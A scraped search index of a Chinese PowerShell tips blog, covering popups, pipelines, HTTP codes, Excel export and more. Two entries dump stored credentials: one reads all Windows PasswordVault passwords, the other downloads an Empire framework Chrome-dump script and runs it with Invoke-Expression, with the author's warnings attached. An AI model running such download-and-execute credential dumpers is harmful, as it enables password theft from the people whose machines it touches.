(Get-Date -Format 'HH:mm:ss') } $out = $cmd.GetSteppablePipeline() $out.Begin($true) } if ($showMember) { $cmd = {&amp; 'Microsoft.PowerShell.Utility\\Get-Member' | Select-Object -Property @{Name = 'Type';Expression = { $_.TypeName }}, Name, MemberType, Definition | Sort-Object -Property Type, { if ($_.MemberType -like '*Property') { 'B' } elseif ($_.MemberType -like '*Method') { 'C' } elseif ($_.MemberType -like '*Event') { 'A' } else { 'D' } }, Name | Out-GridView -Title Member } $outMember = $cmd.GetSteppablePipeline() $outMember.Begin($true) } } process { $isError = $_ -is [System.Management.Automation.ErrorRecord] if ($showMember -and (-not $isError)) { $outMember.Process($_) } if ($showAllProps -and (-not $isError)) { $_ = $_ | Select-Object -Property * } if (($showGridView) -and (-not $isError)) { $out.Process($_) } $steppablePipeline.Process($_) } end { $steppablePipeline.End() if ($showGridView) { $out.End() } if ($showMember) { $outMember.End() } }} 要移除这个覆盖函数，只需要运行： 1PS C:\\&gt; del function:Out-Default","link":"/2019/07/09/overriding-out-default-part-3/"},{"title":"PowerShell 技能连载 - 检测按键","text":"PowerShell 可能需要知道当前是否按下了给定的键。这样，您的配置文件脚本就可以在 PowerShell 启动期间基于您所按下的键执行一些操作。例如，在启动 PowerShell 时按住 CTRL 键，配置文件脚本可以预加载某些模块或连接到服务器。 以下是 Powershell 检测按键的方法： 1234567891011121314151617# this could be part of your profile scriptAdd-Type -AssemblyName WindowsBaseAdd-Type -AssemblyName PresentationCore# assume the script is doing something# (so you can get ready and press left Ctrl!)Start-Sleep -Seconds 2# choose the key you are after$key = [System.Windows.Input.Key]::LeftCtrl$isCtrl = [System.Windows.Input.Keyboard]::IsKeyDown($key)if ($isCtrl){ 'You pressed left CTRL, so I am now doing extra stuff'}","link":"/2019/07/11/detecting-key-presses/"},{"title":"PowerShell 技能连载 - 提高管道速度","text":"PowerShell 管道在处理大量元素时往往比较慢。可能需要很多时间： 1234$result = 1..15000 |ForEach-Object { &quot;Line $_&quot;} 一种更快的方法是用匿名脚本块代替 ForEach-Object，它会带来 200 倍的速度提升： 1234$result = 1..15000 | &amp; { process { &quot;Line $_&quot; }}","link":"/2019/07/15/increasing-pipeline-speed/"},{"title":"PowerShell 技能连载 - 用哈希表提高代码可读性","text":"也许你在过去偶然见过这样的代码： 1234$shell = New-Object -ComObject WScript.Shell$value = $shell.Popup('Restart Computer?', 5, 'Important', 36)&quot;Choice: $value&quot; 这段代码打开一个对话框，询问用户是否可以重启计算机。弹出对话框有一个内置超时设置，因此即使在无人值守的情况下运行，代码也不会停止。 但是，由于 PowerShell 使用的是一种旧的 COM 方法，它是由加密的 ID 来控制。用户无法理解 “36” 表示一个带有 YesNo 按钮和问号的对话框。那么如何转义返回的值呢？ 哈希表可以以一种简单的方法来包装代码数字，并使代码更具可读性。请看： 12345678910111213141516171819202122232425262728293031323334353637383940414243$timeoutSeconds = 5$title = 'Important'$message = 'Restart Computer?'$buttons = @{ OK = 0 OkCancel = 1 AbortRetryIgnore = 2 YesNoCancel = 3 YesNo = 4 RetryCancel = 5}$icon = @{ Stop = 16 Question = 32 Exclamation = 48 Information = 64}$clickedButton = @{ -1 = 'Timeout' 1 = 'OK' 2 = 'Cancel' 3 = 'Abort' 4 = 'Retry' 5 = 'Ignore' 6 = 'Yes' 7 = 'No'}$shell = New-Object -ComObject WScript.Shell$value = $shell.Popup($message, $timeoutSeconds, $title, $buttons.YesNo + $icon.Question)&quot;Raw result: $value&quot;&quot;Cooked result: &quot; + $clickedButton.$valueSwitch ($clickedButton.$value){ 'Yes' { 'restarting' } 'No' { 'aborted' } 'Timeout'{ 'you did not make a choice' }} 多亏了哈希表，代码使用 $buttons.YesNo + $icon.Question 而不是指定 “36”，而且一旦运行了代码(这样就定义了哈希表)，甚至可以获得可用选项的智能感知。 同样，通过使用原始返回值作为哈希表的键，可以轻松地将返回代码转换为人类可读的格式。通过这种方式，您可以使用 switch 语句并为用户单击的按钮分配脚本块，而不必知道单个按钮代码。","link":"/2019/07/17/use-hash-tables-to-make-code-readable/"},{"title":"PowerShell 技能连载 - 使用始终可见的弹出对话框","text":"在上一个技能中，我们使用了一种古老的 COM 技术来显示带有内置超时的弹出框。除了对话框有时会被覆盖在 PowerShell 窗口下之外，这种方法运行得非常好。 通过一个鲜为人知的技巧，你可以确保对话框总是打开在所有其他窗口的顶部: 1234$shell = New-Object -ComObject WScript.Shell$value = $shell.Popup(&quot;You can't cover me!&quot;, 5, 'Example', 17 + 4096)&quot;Choice: $value&quot; 关键是在参数中添加 4096 来控制按钮和图标。这将该对话框转换为模态对话框：它保证在所有现有窗口之上打开，并且永远不会被覆盖。 使用哈希表来包装所有这些幻数，这又是一个好办法: 1234567891011121314151617181920212223242526272829303132333435363738394041$timeoutSeconds = 5$title = 'Example'$message = &quot;You can't cover me!&quot;$buttons = @{ OK = 0 OkCancel = 1 AbortRetryIgnore = 2 YesNoCancel = 3 YesNo = 4 RetryCancel = 5}$icon = @{ Stop = 16 Question = 32 Exclamation = 48 Information = 64}$clickedButton = @{ -1 = 'Timeout' 1 = 'OK' 2 = 'Cancel' 3 = 'Abort' 4 = 'Retry' 5 = 'Ignore' 6 = 'Yes' 7 = 'No'}$ShowOnTop = 4096$shell = New-Object -ComObject WScript.Shell$value = $shell.Popup($message, $timeoutSeconds, $title, $buttons.Ok + $icon.Exclamation + $ShowOnTop)Switch ($clickedButton.$value){ 'OK' { 'you clicked OK' } 'Timeout'{ 'you did not click anything, timeout occurred' }}","link":"/2019/07/19/using-pop-up-dialogs-that-are-always-visible/"},{"title":"PowerShell 技能连载 - 通过 PowerShell 安装 Google Chrome","text":"要下载并安装谷歌Chrome浏览器，只需几个常见的 PowerShell 命令组合： 12345$Installer = &quot;$env:temp\\chrome_installer.exe&quot;$url = 'http://dl.google.com/chrome/install/375.126/chrome_installer.exe'Invoke-WebRequest -Uri $url -OutFile $Installer -UseBasicParsingStart-Process -FilePath $Installer -Args '/silent /install' -WaitRemove-Item -Path $Installer","link":"/2019/07/23/installing-google-chrome-via-powershell/"},{"title":"PowerShell 技能连载 - 从 Windows 中转储个人密码","text":"Windows 有一个受保护的密码库，它可以在其中存储您的密码，因此您不必始终在 InternetExplorer 或 Edge 中手动输入密码。 如果您习惯了自动密码管理器，可能偶尔会忘记原始密码。下面是一个超级简单的 PowerShell 方法来转储存储在 Windows 密码库中的所有密码： 1234567891011# important: this is required to load the assembly[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime](New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() |ForEach-Object { $_.RetrievePassword() $_} |Select-Object -Property Username, Password, Resource |Out-GridView 请注意，如果您从未在 InternetExplorer 或 Edge 中存储凭据，则不会得到任何结果。还请注意，此代码设计的工作方式：只有您只能检索密码，就像您在浏览器中访问网站并要求浏览器为您填写凭据一样。 转储所有存储的密码说明了为什么在您不在时始终锁定您的计算机是如此重要。如果您让您的计算机无人值守的话，任何人都可以运行此 PowerShell 代码来转储您的个人密码。","link":"/2019/07/25/dumping-personal-passwords-from-windows/"},{"title":"PowerShell 技能连载 - 转储 Chrome 的所有密码","text":"在前面的技能中，我们演示了如何从个人 Windows 密码库转储所有密码。基本上任何密码管理器都是如此，因为这些程序的目的是返回它们为您存储的密码。 谷歌 Chrome 浏览器将您的个人密码（和网站历史记录）存储在 SQLLite 数据库中。PowerShell 可以轻松地访问这个数据库并为您转储信息。但是，要做到这一点，PowerShell 需要不属于 Windows 的特定 SQLLite 程序集。 下面的代码展示了如何 (a) 通过一行程序下载大量代码，(b) 在下载的代码中嵌入一个二进制 .net 程序集。 警告：只能在演示机器上运行此代码，或者确保先下载代码，然后在运行之前仔细检查。代码是从第三方下载的，您永远不知道这些代码是否包含恶意内容。 如果你希望转储 Chrome 的隐私信息，我们建议你把代码下载到一个安全的机器上，隔离并检查它，然后在需要的时候从本地保存的副本中使用它。永远不要从不可信的来源下载和执行代码，除非仔细检查代码的实际功能： 12345678# download the code from GitHub$url = 'https://raw.githubusercontent.com/adaptivethreat/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'$code = Invoke-RestMethod -Uri $url -UseBasicParsing# run the codeInvoke-Expression $code# now you have a new function called Get-ChromeDumpGet-ChromeDump 注意，当Chrome运行时，SQLLite数据库被锁定。你需要关闭Chrome才能转储它的隐私数据。 代码来自未知或不可信源的事实并不意味着代码不好。事实上，当您查看代码时，您会发现一些有趣的技术： 123456# download the code from GitHub$url = 'https://raw.githubusercontent.com/adaptivethreat/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'# and copy it to the clipboardInvoke-RestMethod -Uri $url -UseBasicParsing | Set-ClipBoard# now paste the code into your editor of choice and inspect it! 您将看到，代码附带了访问 SQLLite 数据库所需的二进制 .net 程序集。二进制文件以 base64 编码为字符串。这是在你的电脑上恢复二进制的部分： 123$content = [System.Convert]::FromBase64String($assembly)$assemblyPath = &quot;$($env:LOCALAPPDATA)\\System.Data.SQLite.dll&quot;Add-Type -Path $assemblyPath 下面是更多与安全相关的PowerShell单行程序：https://chrishales.wordpress.com/2018/01/03/powershell-password-one-liners/","link":"/2019/07/29/dumping-all-passwords-from-chrome/"},{"title":"PowerShell 技能连载 - 控制处理器关联性","text":"大多数现代计算机都有不止一个处理器，无论是物理处理器还是逻辑处理器。如果你想知道处理器的数量，这里有一段 PowerShell 代码: 12Get-WmiObject -Class Win32_Processor | Select-Object -Property Caption, NumberOfLogicalProcessors 结果看起来类似这样： Caption NumberOfLogicalProcessors ------- ------------------------- Intel64 Family 6 Model 78 Stepping 3 4 当您在这样的机器上运行一个进程时，它通常没有特定的处理器关联性，因此 Windows 决定该进程将运行在哪个处理器上。 如果愿意，可以为每个进程声明一个特定的处理器关联。这是很有用的，例如，如果你想控制一个程序可以使用的处理器，也就是防止一个进程使用所有的处理器。 处理器关联性由位标志控制。要找出当前处理器与进程的关联关系，请使用以下代码: 12$process = Get-Process -Id $PID[Convert]::ToString([int]$process.ProcessorAffinity, 2) 在本例中，用的是当前的 PowerShell 进程，但是您可以指定任何进程。典型的结果是: 1111 在 4 处理器的机器上，进程没有特定的关联性，可以使用任何处理器。要设置新的关联，最简单的方法是使用自己的位掩码并更改属性。例如，要将当前 PowerShell 进程仅锁定到第一个处理器，可以这样做: 1234567# calculate the bit mask$mask = '1000'$bits = [Convert]::ToInt32($mask, 2)# assign new affinity to current PowerShell process$process = Get-Process -Id $PID$process.ProcessorAffinity = $bits","link":"/2019/07/31/controlling-processor-affinity/"},{"title":"PowerShell 技能连载 - 查找隐藏的 PowerShell 应用","text":"最广为人知的 PowerShell 宿主当然是 PowerShell.exe 和 powershell_ise.exe，因为它们是开箱即用的。但是，运行 PowerShell 的宿主可能更多（而且是隐藏的）。任何实例化 PowerShell 引擎的软件都是一个 PowerShell 宿主。这可以是 Visual Studio Code（安装了 PowerShell扩展）、Visual Studio 或任何其它类似的软件。 要找出所有当前运行 PowerShell 的宿主，请运行以下命令： 12345678Get-ChildItem -Path &quot;\\\\.\\pipe\\&quot; -Filter '*pshost*' | ForEach-Object { $id = $_.Name.Split('.')[2] if ($id -ne $pid) { Get-Process -ID $id } } 结果看起来类似这样： Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName ------- ------ ----- ----- ------ -- -- ----------- 1131 101 628520 42440 11216 0 SupportAssistAgent 1011 82 269920 299208 85,30 17420 1 powershell_ise 520 29 68012 75880 1,23 33532 1 powershell 590 31 69508 77712 2,02 36636 1 powershell 545 27 67952 76668 1,14 37584 1 powershell 4114 654 801136 965032 129,69 28968 1 devenv “SupportAssistAgent” 是由 Visual Studio Code 打开的，而 “devenv” 代表由 Visual Studio 启动的内部 PowerShell 宿主。","link":"/2019/08/02/finding-hidden-powershell-applications/"},{"title":"PowerShell 技能连载 - 接受屏蔽的密码","text":"如果曾经写过需要接受密码等敏感输入的 PowerShell 函数，请确保允许用户传入 SecureString。如果您通过明文接受密码，则存在很大的风险，即其他人可能在输入密码时看到密码，或者（更糟的是）密码已被记录，稍后可以在转储文件中找到。 下面是一个简单的框架，说明如何实现安全输入： 123456789101112131415function Enter-Secret{ param ( [Parameter(Mandatory)] [SecureString] $SafeInput ) $PlainText = [Management.Automation.PSCredential]:: new('x',$SafeInput).GetNetworkCredential().Password &quot;User entered $PlainText&quot;} 当用户运行 Enter-Secret，可以以屏蔽的方式输入密码。在内部，函数将安全字符串转换为纯文本。这样，秘密密码就永远不可见，也永远不会被记录下来。 从 SecureString 到 String 的转换是通过创建一个临时凭证对象来执行的。凭据对象有一个内置方法 (GetNetworkCredential())，用于将SecureString 转换为字符串。","link":"/2019/08/06/accepting-masked-passwords/"},{"title":"PowerShell 技能连载 - 为输出编号（第 1 部分）","text":"如果你想增加一个递增的数字到你的输出，这里有一个简单的方法: 1234567Get-Process | Select-Object -Property '#', ProcessName, CPU -First 10 | ForEach-Object -begin { $i = 0} -process { $i++ $_.'#' = $i $_ } -end {} Select-Object 添加了一个名为 “#“ 的新属性，ForEach-Object 添加了一个自动递增的数字。结果如下： # ProcessName CPU - ----------- --- 1 AdobeCollabSync 65,5625 2 AdobeCollabSync 0,5 3 AGMService ...","link":"/2019/08/08/numbering-output-part-1/"},{"title":"PowerShell 技能连载 - 验证 Active Directory 凭据","text":"PowerShell 可以通过 Active Directory 验证 AD 用户名和密码： 1234Add-Type -AssemblyName System.DirectoryServices.AccountManagement$account = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([DirectoryServices.AccountManagement.ContextType]::Domain, $env:userdomain)$account.ValidateCredentials('user12', 'topSecret') 请注意这种方法只能作为诊断目的。它以明文的方式输入密码。","link":"/2019/08/12/validating-active-directory-credentials/"},{"title":"PowerShell 技能连载 - 通过 Web Service 做单位转换","text":"通过 PowerShell 访问 RESTful Web Service 十分容易：只需要将您的发送数据发给公开的 Web Service，并且接收结果即可。 以下是三个 PowerShell 函数，每个函数处理一个数字转换： 12345678910111213141516171819202122232425262728293031323334353637383940414243function Convert-InchToCentimeter{ param ( [Parameter(Mandatory)] [Double] $Inch ) [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $url = 'https://ucum.nlm.nih.gov/ucum-service/v1/ucumtransform/{0}/from/%5Bin_i%5D/to/cm' -f $Inch $result = Invoke-RestMethod -Uri $url -UseBasicParsing $result.UCUMWebServiceResponse.Response}function Convert-FootToMicrometer{ param ( [Parameter(Mandatory)] [Double] $Foot ) [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $url = 'https://ucum.nlm.nih.gov/ucum-service/v1/ucumtransform/{0}/from/%5Bft_i%5D/to/um' -f $Foot $result = Invoke-RestMethod -Uri $url -UseBasicParsing $result.UCUMWebServiceResponse.Response}function Convert-GramToOunce{ param ( [Parameter(Mandatory)] [Double] $Gram ) [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $url = 'https://ucum.nlm.nih.gov/ucum-service/v1/ucumtransform/{0}/from/g/to/%5Boz_ap%5D' -f $Gram $result = Invoke-RestMethod -Uri $url -UseBasicParsing $result.UCUMWebServiceResponse.Response} 假设您有 Internet 连接，然后做单位换算就是一个函数调用那么简单了： 12345PS C:\\&gt; Convert-GramToOunce -Gram 230SourceQuantity SourceUnit TargetUnit ResultQuantity-------------- ---------- ---------- --------------230.0 g [oz_ap] 7.3946717 需要注意的点有： 您需要允许 Tls12 来允许 HTTPS 连接（参考代码） 您需要遵守 Web Service 规定的规则，即当它需要整个数数时，您不能提交小数。 更多的转换功能请参考 https://ucum.nlm.nih.gov/ucum-service.html#conversion，您可以使用以上提供的函数作为模板来创建更多的转换函数。","link":"/2019/08/14/unit-conversion-via-web-service/"},{"title":"PowerShell 技能连载 - 测试网站的可用性","text":"当一个网站不可用时，通常的问题是仅仅您不能访问该网站，还是其他所有人都不能访问。PowerShell 可以调用一个 Web Service 为您检查 web 站点的可用性。下面是一个简单的包装函数: 123456789101112131415161718function Test-Url{ param ( [Parameter(Mandatory,ValueFromPipeline)] [string] $Url ) Add-Type -AssemblyName System.Web $check = &quot;https://isitdown.site/api/v3/&quot; $encoded = [System.Web.HttpUtility]::UrlEncode($url) $callUrl = &quot;$check$encoded&quot; Invoke-RestMethod -Uri $callUrl | Select-Object -Property Host, IsItDown, Response_Code} 它将调用一个 RESTful API 并且通过 URL 参数进行检查。这是为什么待测试的 URL 需要进行 URL 编码，这段代码调用 Invoke-RestMethod 并且以一个对象的形式接收测试结果。 12345PS C:\\&gt; Test-Url -Url powershellmagazine.comhost isitdown response_code---- -------- -------------powershellmagazine.com False 200 请注意这个示例中使用的 Web Service 是免费的，并且不需要注册或 API 密钥。缺点是该 Web Service 是限流的它可能会返回一个异常，提示您提交了太多请求。当这种情况发生时，只需要等待一阵子再重试。","link":"/2019/08/16/test-web-site-availability/"},{"title":"PowerShell 技能连载 - 转换 HTTP 响应码","text":"在前一个示例中我们创建了一个小的 PowerShell 函数，它能够检查 Web 网络的可用性，并 HTTP 返回码会作为测试结果的一部分返回。让我们看看如何可以轻松地将这个数字代码转换为有意义的文本消息。 以下还是那个测试网站的函数： 123456789101112131415161718function Test-Url{ param ( [Parameter(Mandatory,ValueFromPipeline)] [string] $Url ) Add-Type -AssemblyName System.Web $check = &quot;https://isitdown.site/api/v3/&quot; $encoded = [System.Web.HttpUtility]::UrlEncode($url) $callUrl = &quot;$check$encoded&quot; Invoke-RestMethod -Uri $callUrl | Select-Object -Property Host, IsItDown, Response_Code} 以下是典型的结果： 12345PS C:\\&gt; Test-Url -Url powershellmagazine.comhost isitdown response_code---- -------- -------------powershellmagazine.com False 200 在这个示例中，响应代码是 “200”，恰好代表 “OK”。如果您希望将 HTTP 响应码转换为文本，只需要将数据类型转换为 [System.Net.HttpStatusCode]。这样就可以了： 12PS C:\\&gt; 200 -as [System.Net.HttpStatusCode]OK 以下是包含该转换过程的版本： 12345678910111213141516171819202122232425function Test-Url{ param ( [Parameter(Mandatory,ValueFromPipeline)] [string] $Url ) Add-Type -AssemblyName System.Web $check = &quot;https://isitdown.site/api/v3/&quot; $encoded = [System.Web.HttpUtility]::UrlEncode($url) $callUrl = &quot;$check$encoded&quot; $response = @{ Name = 'Response' Expression = { '{0} ({1})' -f ($_.Response_Code -as [System.Net.HttpStatusCode]), $_.Response_Code } } Invoke-RestMethod -Uri $callUrl | Select-Object -Property Host, IsItDown, $response} 结果如下： 12345PS C:\\&gt; Test-Url -Url powershellmagazine.comhost isitdown Response---- -------- --------powershellmagazine.com False OK (200) 请注意计算字段 “Response” 现在体现的是原始的数值型响应码和对应的友好文本。","link":"/2019/08/20/converting-http-response-codes/"},{"title":"PowerShell 技能连载 - 自动创建 HTTP 响应码清单","text":"在前一个示例中我们学习了如何自动将数值型的 HTTP 响应码转换为描述性的文本，只需要将它们转换为 System.Net.HttpStatusCode 即可。 12PS&gt; [System.Net.HttpStatusCode]500InternalServerError 这是因为 System.Net.HttpStatusCode 是一个所谓的“枚举”，其作用类似于“查找表”。您可以轻松地转储枚举的所有成员，例如创建一个 HTTP 响应代码表： 1234567[Enum]::GetValues([System.Net.HttpStatusCode]) | ForEach-Object { [PSCustomObject]@{ Code = [int]$_ Description = $_.toString() } } 以上是创建一个最常见的 HTTP 响应码所需要的所有代码。 Code Description ---- ----------- 100 Continue 101 SwitchingProtocols 200 OK 201 Created 202 Accepted 203 NonAuthoritativeInformation 204 NoContent 205 ResetContent 206 PartialContent 300 MultipleChoices 300 MultipleChoices 301 MovedPermanently 301 MovedPermanently 302 Redirect 302 Redirect 303 SeeOther 303 SeeOther 304 NotModified 305 UseProxy 306 Unused 307 TemporaryRedirect 307 TemporaryRedirect 400 BadRequest 401 Unauthorized 402 PaymentRequired 403 Forbidden 404 NotFound 405 MethodNotAllowed 406 NotAcceptable 407 ProxyAuthenticationRequired 408 RequestTimeout 409 Conflict 410 Gone 411 LengthRequired 412 PreconditionFailed 413 RequestEntityTooLarge 414 RequestUriTooLong 415 UnsupportedMediaType 416 RequestedRangeNotSatisfiable 417 ExpectationFailed 426 UpgradeRequired 500 InternalServerError 501 NotImplemented 502 BadGateway 503 ServiceUnavailable 504 GatewayTimeout 505 HttpVersionNotSupported 这种方法适用于您可能遇到的任何枚举。只需更改枚举数据类型的名称即可。这个例子转储可用的控制台颜色代码： 12345678910111213141516171819202122232425262728[Enum]::GetValues([System.ConsoleColor]) | ForEach-Object { [PSCustomObject]@{ Code = [int]$_ Description = $_.toString() } }Code Description---- ----------- 0 Black 1 DarkBlue 2 DarkGreen 3 DarkCyan 4 DarkRed 5 DarkMagenta 6 DarkYellow 7 Gray 8 DarkGray 9 Blue 10 Green 11 Cyan 12 Red 13 Magenta 14 Yellow 15 White","link":"/2019/08/22/auto-creating-a-list-of-http-response-codes/"},{"title":"PowerShell 技能连载 - 使用超棒的 Export-Excel Cmdlet（第 1 部分）","text":"Doug Finke 创建了一个非常棒的 PowerShell 模块 ImportExcel，它提供了从 Microsoft Excel 导入和导出数据所需的所有命令。它不需要安装Office。 我们不能涵盖这个模块提供的所有内容，但在本文中，我们将为您提供启动和运行它的基础知识，在后续的技巧中，我们将讨论一些格式化技巧。 要使用 Excel 命令，只需要下载并安装免费的模块： 1PS&gt; Install-Module -Name ImportExcel -Scope CurrentUser -Force 首次运行时，您可能必须同意下载一个 “NuGet” 开源DLL。命令完成后，您现在可以访问大量新的 Excel 命令，其中最重要的是 Export-Excel。 您现在可以通过管道将数据直接传给一个 Excel 文件，并且假设在 Microsoft Office 已经安装的情况下，您甚至可以在 Excel 中打开并显示文件（创建 .xlsx 文件不需要 Office）。 以下是一个简单的示例： 123$Path = &quot;$env:temp\\report.xlsx&quot;Get-Process | Where-Object MainWindowTitle | Export-Excel -Path $path -ClearSheet -WorksheetName Processes -Show 就是这么简单。创建 Excel 文件从来没有这么容易过。不过，你要记住以下几点： 在将数据通过管道传给 Export-Excel 之前，使用 Select-Object 选择要导出的属性。 使用 -ClearSheet 清除以前的数据。如果省略此参数，新数据将附加到 .xlsx 文件中的现有数据之后。 在创建具有相同名称的新文件之前，您可能需要考虑手动删除旧的 .xlsx 文件。否则，Export-Excel 可能会参考旧文件中的现有设置。","link":"/2019/08/26/using-awesome-export-excel-cmdlet-part-1/"},{"title":"PowerShell 技能连载 - 使用超棒的 Export-Excel Cmdlet（第 2 部分）","text":"这是我们关于 Doug Finke 的强大而免费的 “ImportExcel” PowerShell 模块的迷你系列文章的第 2 部分。在学习这个技能之前，请确保安装了该模块： 1PS&gt; Install-Module -Name ImportExcel -Scope CurrentUser -Force 当您导出数据到 Excel 文件中时，您有时可能会遇到 Excel 错误解释的数据。例如，电话号码常常被错误地解释为数字型数据。以下是一个重现该问题的示例： 123456789101112131415161718192021# any object-oriented data will do# we create some sample records via CSV# to mimick specific issues$rawData = @'Phone,Name+4915125262524, Tobias0766256725672, Mary00496253168722567, Tom'@ | ConvertFrom-Csv# create this Excel file$Path = &quot;$env:temp\\report.xlsx&quot;# make sure the file is deleted so we have no# effects from previous data still present in the# file. This requires that the file is not still# open and locked in Excel$exists = Test-Path -Path $Pathif ($exists) { Remove-Item -Path $Path}$rawData | Export-Excel -Path $path -ClearSheet -WorksheetName Processes -Show 如您所见，当 Excel 打开时，电话号码自动转换为整形。 要避免这个自动转换，请使用 -NoNumberConversion 参数，并且指定不需要转换的列： 123456789101112131415161718192021# any object-oriented data will do# we create some sample records via CSV# to mimick specific issues$rawData = @'Phone,Name+4915125262524, Tobias0766256725672, Mary00496253168722567, Tom'@ | ConvertFrom-Csv# create this Excel file$Path = &quot;$env:temp\\report.xlsx&quot;# make sure the file is deleted so we have no# effects from previous data still present in the# file. This requires that the file is not still# open and locked in Excel$exists = Test-Path -Path $Pathif ($exists) { Remove-Item -Path $Path}$rawData | Export-Excel -Path $path -ClearSheet -WorksheetName Processes -Show -NoNumberConversion Phone 现在，”Phone” 列不再处理为数字，电话号码显示正常了。","link":"/2019/08/28/using-awesome-export-excel-cmdlet-part-2/"},{"title":"PowerShell 技能连载 - 使用超棒的 Export-Excel Cmdlet（第 3 部分）","text":"这是我们关于 Doug Finke 的强大而免费的 “ImportExcel” PowerShell 模块的迷你系列文章的第 3 部分。在学习这个技能之前，请确保安装了该模块： 1PS&gt; Install-Module -Name ImportExcel -Scope CurrentUser -Force 在第 2 部分中，我们检查了由于数字自动转换导致的错误解释。当原始数据”看起来像“ Excel 公式时会导致另一个问题，它们会被转换为公式并且会在等等打开时出现问题。 以下是重现该问题的示例：一些记录包含以 “=)” 开头的文本，会导致 Excel 认为它是一个公式： 123456789101112131415161718192021# any object-oriented data will do# we create some sample records via CSV# to mimick specific issues$rawData = @'Data,NameTest, Tobias=), Mary=:-(), Tom'@ | ConvertFrom-Csv# create this Excel file$Path = &quot;$env:temp\\report.xlsx&quot;# make sure the file is deleted so we have no# effects from previous data still present in the# file. This requires that the file is not still# open and locked in Excel$exists = Test-Path -Path $Pathif ($exists) { Remove-Item -Path $Path}$rawData | Export-Excel -Path $path -ClearSheet -WorksheetName Processes -Show 当您运行这段代码时，Excel 将打开但是立即报告非法格式。原始数据将会丢失。 这个问题无法通过一个开关参数解决。相反，您需要手动重新格式化单元格，这给了您很大的灵活性。以下是总体的策略： 使用 Export-Excel 创建 .xlsx 文件，但不是指定 -Show（在 Excel 中打开文件），而是使用 -PassThru。这样就得到了 Excel 对象模型。 使用对象模型对单元格进行任意更改 使用 Close-ExcelPackage 将更改保存到文件中。您现在可以指定 -Show，并在 Excel 中打开结果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445# any object-oriented data will do# we create some sample records via CSV# to mimick specific issues$rawData = @'Data,NameTest, Tobias=), Mary=:-(), Tom'@ | ConvertFrom-Csv# create this Excel file$Path = &quot;$env:temp\\report.xlsx&quot;# make sure the file is deleted so we have no# effects from previous data still present in the# file. This requires that the file is not still# open and locked in Excel$exists = Test-Path -Path $Pathif ($exists) { Remove-Item -Path $Path}$sheetName = 'Testdata'$excel = $rawData | Export-Excel -Path $path -ClearSheet -WorksheetName $sheetName -PassThru#region Post-process the column with the misinterpreted formulas# remove the region to repro the original Excel error$sheet1 = $excel.Workbook.Worksheets[$sheetName]# take all cells from row &quot;A&quot;...$sheet1.Cells['A:A'] |# ...that are currently interpreted as a formula...Where-Object Formula |ForEach-Object { # ...construct the original content which is the formula # plus a prepended &quot;=&quot; $newtext = ('={0}' -f $_.Formula) # reformat cell to number type &quot;TEXT&quot; Set-Format -Address $_ -NumberFormat 'Text' -Value 'dummy' # assign the original content to the cell (this cannot be done using Set-Format) $_.Value = $newtext}#endregionClose-ExcelPackage -ExcelPackage $excel -Show 当您运行这段代码时，Excel 工作簿打开时不会报错，并且第一列能够正确地显示内容。这是由于我们显式地将第一列格式化为“文本”。然后，一旦格式被设置为“文本”，那么公式内容就会作为单元格值插入。 您不会受到“公式”错误信息，也不必通过在其周围添加引号来“屏蔽”内容。 这个示例演示了如何后期处理 Excel 工作簿并且在将结果保存到文件并在 Excel 中打开结果之前增加、更改、重新格式化独立的单元格。","link":"/2019/08/30/using-awesome-export-excel-cmdlet-part-3/"},{"title":"PowerShell 技能连载 - 使用超棒的 Export-Excel Cmdlet（第 4 部分）","text":"这是我们关于 Doug Finke 的强大而免费的 “ImportExcel” PowerShell 模块的迷你系列文章的第 4 部分。在学习这个技能之前，请确保安装了该模块： 1PS&gt; Install-Module -Name ImportExcel -Scope CurrentUser -Force 在第 3 部分中，我们研究了由于公式自动转换而导致的错误解析数据，并研究了后期处理单个单元格格式的方式。让我们检查一下数组引起的问题。 以下是一些重现该现象的代码。在我们的示例中，这是最后 10 条系统事件的事件日志数据，它恰好包含了一个数组（替换字符串），并且显示完全不正常： 1234567891011121314151617# get some raw data that contains arrays$rawData = Get-EventLog -LogName System -Newest 10 | Select-Object -Property TimeWritten, ReplacementStrings, InstanceId# create this Excel file$Path = &quot;$env:temp\\report.xlsx&quot;# make sure the file is deleted so we have no# effects from previous data still present in the# file. This requires that the file is not still# open and locked in Excel$exists = Test-Path -Path $Pathif ($exists) { Remove-Item -Path $Path}$sheetName = 'Testdata'$rawData | Export-Excel -Path $path -ClearSheet -WorksheetName $sheetName -Show 当 Excel 打开时，您可以看见 “ReplacementStrings” 列只显示数据类型 (System.String[]) 而不是实际的数据。这是 Excel 遇到数组的通常行为，所以 Export-Excel 对此无能为力。 相反地，在将将数组通过管道输出到 Export-Excel 命令之前转换为字符串是您的责任——用 -join 操作符可以很容易实现： 1234567891011121314151617181920212223# get some raw data that contains arrays$rawData = Get-EventLog -LogName System -Newest 10 | Select-Object -Property TimeWritten, ReplacementStrings, InstanceId# create this Excel file$Path = &quot;$env:temp\\report.xlsx&quot;# make sure the file is deleted so we have no# effects from previous data still present in the# file. This requires that the file is not still# open and locked in Excel:$exists = Test-Path -Path $Pathif ($exists) { Remove-Item -Path $Path}$sheetName = 'Testdata'$rawData | ForEach-Object { # convert column &quot;ReplacementStrings&quot; from array to string $_.ReplacementStrings = $_.ReplacementStrings -join ',' # return the changed object $_ } | Export-Excel -Path $path -ClearSheet -WorksheetName $sheetName -Show 当您做了这步操作之后，包含数组的属性在 Excel 中也可以正确显示。-join 对任何对象都有效。只需要确保指定了分割数组元素的分隔符。","link":"/2019/09/03/using-awesome-export-excel-cmdlet-part-4/"},{"title":"PowerShell 技能连载 - 使用超棒的 Export-Excel Cmdlet（第 5 部分）","text":"这是我们关于 Doug Finke 的强大而免费的 “ImportExcel” PowerShell 模块的迷你系列文章的第 5 部分。在学习这个技能之前，请确保安装了该模块： 1PS&gt; Install-Module -Name ImportExcel -Scope CurrentUser -Force 在第 4 部分中，我们研究了由于在输入数据中包含数组而导致的误读数据。正如您所看到的，您只需要使用 -join 操作符将数组转换为字符串，Excel 